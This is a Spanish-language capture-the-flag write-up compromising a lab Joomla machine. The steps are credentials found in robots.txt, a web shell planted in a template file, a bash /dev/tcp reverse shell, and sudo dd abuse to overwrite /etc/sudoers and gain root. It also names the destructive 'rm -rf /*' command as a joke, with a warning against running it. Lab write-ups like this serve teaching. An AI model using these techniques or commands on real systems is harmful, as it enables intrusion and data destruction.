
-------------

>Una maquina sencillita, perfecta para empezar a entender conceptos sobre explotación de CMSs, sin mas, empezamos :3

![\1](/Attachments/Pasted%20image%2020250510150030.png)

>Primero, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![\1](/Attachments/Pasted%20image%2020250510150233.png)

>Para comprobar conectividad, probamos con trazas ICMP a la ip victima, para ello usamos "Ping"

![\1](/Attachments/Pasted%20image%2020250510150500.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Como primer paso, realizaremos un escaneo de puertos abiertos con nmap:

![\1](/Attachments/Pasted%20image%2020250510150650.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sCV (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Vemos que solo el puerto 80 esta disponible en la maquina, con un servicio "Apache httpd 2.4.58" corriendo en el. Uno de los scripts de Nmap nos ha detectado el CMS "Joomla" y el robots.txt, con algunas de sus rutas. Para un poco mas de información Podemos usar "whatweb" Para identificar tecnologías en la web:

![\1](/Attachments/Pasted%20image%2020250510151155.png)
_Whatweb es una herramienta de reconocimiento web creada en Ruby, esta hecha para identificar tecnologías web (Es capaz de detectar Frameworks, plugins, CMS, etc).
Por lo general, mediante una petición GET, recolecta información de toda la respuesta (Cookies, código HTML, encabezados), para que luego, el motor de whatweb con REGEX (expresiones regulares) y sus propios plugins (scripts) de Ruby analicen la respuesta en búsqueda de particularidades propias de tecnologías (Como wp-content para WordPress, X-Powered-By para php o /templates/Joomla para Joomla).
Al encontrar coincidencias. usa sus propios plugins (scripts) de Ruby para identificar las tecnologías:
![\1](/Attachments/Pasted%20image%2020250506154219.png)_
_Whatweb nos permite modificar la agresividad del escaneo, modificar hilos y hasta usar un proxy, en este caso, solo modificamos la agresividad con el parámetro "-a 3" para "nivel 3 de agresividad".

>Ya conociendo mas las tecnologías de la web, le hachamos un ojo:

![\1](/Attachments/Pasted%20image%2020250510151605.png)

>Vemos una web simple con un panel de login y sin mucho mas, al inspeccionar el robots.txt:

![\1](/Attachments/Pasted%20image%2020250510151947.png)
_Robots.txt es un archivo en texto plano que se coloca en la raíz de una web, su objetivo es dar instrucciones a los motores de búsqueda sobre las rutas de la web que se deben y NO se deben indexar como en este caso. Su mala configuración puede develar información sobre directorios sensibles._

>Observamos varios directorios web a los que tenemos acceso y además un usuario y una contraseña O.O
>En el directorio un_caramelo se puede ver una pagina aun en construcción, que en su código fuente, tiene las misma claves que acabamos de encontrar en el "robots.txt":

![\1](/Attachments/Pasted%20image%2020250510153659.png)

>Por otro lado, en el directorio /administrator/ encontramos el panel de login de administrador del CMS Joomla:

![\1](/Attachments/Pasted%20image%2020250510153917.png)_El panel de administrador de Joomla, es como el panel de gestión de toda la web, quien ingresa, es capaz de modificar Plugins, directorios web, archivos, prácticamente todo...
Si el panel esta mal configurado (tiene claves débiles, no tiene limite de solicitudes http o no tiene segundo factor de autenticación) es vulnerable_

>Como ya tenemos las claves de acceso que encontramos en la web, nos intentamos autenticar   ╰(*°▽°*)╯

![\1](/Attachments/Pasted%20image%2020250510155000.png)

>Tristemente, no podemos :(
>La contraseña puede estar encriptada, como no sabemos bajo que algoritmo, vamos a pasarla por CyberChef:

![\1](/Attachments/Pasted%20image%2020250510155339.png)
_[CiberChef](https://gchq.github.io/CyberChef/) es una herramienta sumamente potente de procesamiento de datos hecha por el servicio de inteligencia británico y de código abierto. Puedes verlo como una navaja suiza (permite extraer metadatos, decodificar archivos ofuscados o codificar y ofuscar payloads). Cada operación es un modulo en JavaScript que funciona 100% del lado del cliente (no tiene backend). Con su función MAGIC se puede hacer una detección automática de algoritmos, como en este caso.

>Era una codificación el base64, si deseas hacerlo manualmente desde terminal puedes usar el mismo "base64" con la flag "-d"

![\1](/Attachments/Pasted%20image%2020250510161216.png)

>Así que ahora si, ingresamos al panel de Admin ╰(*°▽°*)╯

![\1](/Attachments/Pasted%20image%2020250510161358.png)

>Lograr esto es una mina de oro, ya que dentro del panel, podemos modificar archivos públicos en php, si logramos inyectar un payload correctamente, al cargar el archivo php desde la web, este se ejecutara, y tendremos un RCE (remote code execution).
>Primero, para poder modificar la web, vamos al apartado /system del panel izquierdo, y luego a Administrator/templates

![\1](/Attachments/Pasted%20image%2020250510161903.png)

>En este caso, elegiremos el archivo "error.php"
>El payload que inyectaremos será uno de los mas sencillos en php, de todas maneras puedes encontrar muchos mas y mas eficaces en [revshell.com](https://www.revshells.com/) 

![\1](/Attachments/Pasted%20image%2020250510165038.png)
1. _Primero con "$cmd =" Almaceno lo siguiente en la variable "cmd"
2. _En php "$_REQUEST" recoge información de el parámetro hacked_
3. Con "system("$cmd")" ejecutamos a nivel de sistema lo que hay en la variable "cmd" (que seria el valor que pasamos con el parámetro hacked)
4. Por ultimo con "die" terminamos la ejecución de todo lo demos del archivo php
_Lo anterior nos permite ingresar comandos mediante un parámetro por la url, comandos que serán ejecutados en el sistema victima con la función system (también serviría la función exec o shell_exec)_

>Ya inyectado y guardado, nos vamos a la ruta web del archivo:

![\1](/Attachments/Pasted%20image%2020250510170212.png)

>Y aplicamos el parámetro con un comando para probar:

![\1](/Attachments/Pasted%20image%2020250510170306.png)
_Agregamos al archivo php el parámetro hacked y luego a este el comando que queremos ejecutar, con la sintaxis predilecta "archivo?paramtro=valor del parámetro"_

>Tenemos un RCE (remote code execution), podemos ejecutar comandos en la web. Sin perder tiempo, vamos a obtener una reverse Shell.

>Primero, debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 1234 con “nc”:

![Where Is My Web Shell](/Attachments/Where%20Is%20My%20Web%20Shell%2014.png)
1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
3. -l Con este parámetro entramos en un modo de escucha de conexiones
4. -v El modo verbose lo usamos para ver más detalles sobre la escucha e información de la conexión
5. -p con este parámetro indicamos el puerto que estará en escucha, en este caso el 1234

>Ya que estamos en escucha vamos a inyectar el payload mas conocido de reverse Shell en la url:

![\1](/Attachments/Pasted%20image%2020250510171244.png)
_//El %26 es una codificación en URL de “&” para que no hayan problemas//_
_Vamos a intentar entenderlo al máximo este comando:_
1. _bash -c Ejecuta lo siguiente dentro de las comillas como una subshell, en pocas palabras, ejecuta el comando entre comillas como si fuera un script de bash._
2. _bash -i Lanza una bash en modo interactivo (para tener una shell medianamente funcional)_
3. _>%26 /dev/tcp/172.17.0.1/1234 0>%261 Es una manera PROPIA de bash para abrir una conexión TCP hacia una ip y un puerto, con la primera parte >%26 /dev/tcp/ip/puerto dirigimos el stdout (respuestas de la shell) de la maquina victima a nuestra ip, y con la segunda parte 0>%261 indicamos que el stdin(comandos que insertamos) de nuestra máquina irá a la ip victima para ser interpretado. En pocas palabras, abrimos una comunicación bidireccional entre nuestra ip y la ip victima, redireccionando nuestra entrada estándar (stdin) y la salida estándar de la víctima (stdout)._

>Con lo anterior, recibimos una reverse Shell por el puerto 1234 :3

![\1](/Attachments/Pasted%20image%2020250510171553.png)

>Primero, vamos a darnos una Shell un poco mas interactiva con:

![\1](/Attachments/Pasted%20image%2020250510171837.png)
_Aquí le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM no se establece o está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionan correctamente (Es para tener una experiencia un poco más funcional).

>Para escalar privilegios, listamos posibles archivos sensibles que puedan existir en la maquina:

![\1](/Attachments/Pasted%20image%2020250510172605.png)
1. _find (comando de búsqueda en Linux)
2. _/ (búsqueda desde la raíz del sistema)
3. _"backup" (filtramos por una cadena)
4. _2>/dev/null (redirige los errores al agujero negro de Linux)
5. _"| grep -i "backup" (Ya que el anterior comando nos devuelve demasiados resultados, filtramos nuevamente con "grep -i" cadenas "backup")

>Vemos un archivo particular "otro_caramelo.txt", al abrirlo:

![\1](/Attachments/Pasted%20image%2020250510173258.png)

>Nos encontramos con la clave del usuario luisillo en texto claro, asi que cambiamos de usuario:

![\1](/Attachments/Pasted%20image%2020250510173642.png)
_Con el binario su, cambiamos de usuario y con el comando /bin/bash -i obtenemos una mejor Shell_

>Ahora, ya que somos luisillo, podemos listar privilegios de usuario, a ver si nos encontramos con algo interesante:

![\1](/Attachments/Pasted%20image%2020250510173822.png)
_Ejecutamos el binario setuid (que siempre se ejecuta como root)“SUDO”, con la flag “-l”. El binario busca los privilegios que el usuario actual tiene descritos en el archivo /etc/sudoers y los muestra por pantalla (Si aplica)_
1. _(ALL) Permite ejecutar el binario como CUALQUIER usuario, incluido claro, el mas privilegiado_
2. _NOPASSWD Nos indica que no es necesario ingresar contraseña para ejecutar el binario_
3. _/bin/dd Binario sobre el que tenemos privilegios (cuya ruta está definida arriba en “secure_path”_

>dd es un binario propio de Linux que nos permite copiar o convertir datos, puede funcionar con cosas sencillas o con cosas muy complejas, el hecho de que se permita ejecutar este binario de manera privilegiada, de por si es un grave error, permite desde borrar todo el disco hasta copiarlo, bit a bit...
>Vamos a [GTFObins](https://gtfobins.github.io/gtfobins/dd/) para buscar una manera de explotarlo para escalar privilegios:

![\1](/Attachments/Pasted%20image%2020250510174727.png)
_Con este payload:
1. "LFILE=file_to_write" _primero creamos una variable que tenga el valor de un archivo sensible al que le queramos inyectar algo
2. _con echo generamos un dato (cadena a inyectar)
3.  "|" redirigimos la cadena como entrada estándar al siguiente comando
4. "sudo /bin/dd of=$LFILE" de esta manera ejecutamos el binario como root he inyectamos la cadena generada a la variable que creamos antes (que hace referencia al archivo sensible al que inyectaremos un comando)

>Ya en conocimiento de que podemos insertar strings a cualquier archivo en el sistema, vamos a ponerlo en practica, insertando una linea que nos de permisos para una bash privilegiada en el archivo "/etc/sudoers"

_Te recomiendo tener mucho cuidado con la sintaxis de la linea a inyectar, ya que "dd" sobrescribe TODAS las líneas de "/etc/sudoers", si lo modificas de manera incorrecta dañaras el archivo, e igual como me paso a mi, tendrás que hacer todo de nuevo :( _

>Empezamos creando una variable cullo valor será "/etc/sudoers"

![\1](/Attachments/Pasted%20image%2020250512214120.png)

>Insertamos el string con la sintaxis propia de /etc/sudoers para asignar permisos a un usuario sobre un binario:

![\1](/Attachments/Pasted%20image%2020250512213344.png)

>Con sudo -l verificamos los permisos de nuestro usuario luisillo nuevamente:

![\1](/Attachments/Pasted%20image%2020250512213411.png)

>Ya viendo que funciono, y nuestro usuario ahora cuenta con privilegios para usar el binario /bin/bash sin contraseña y como root, vamos a escalar privilegios:

![\1](/Attachments/Pasted%20image%2020250512213441.png)

>Ya tendríamos la maquinita :3

O.O   //El comando "rm -rf /*" ejecutado como administrador borra todos los archivos del sistema, es un pequeño guiño al ganar acceso como root a una máquina, NO LO EJECUTES//   O.O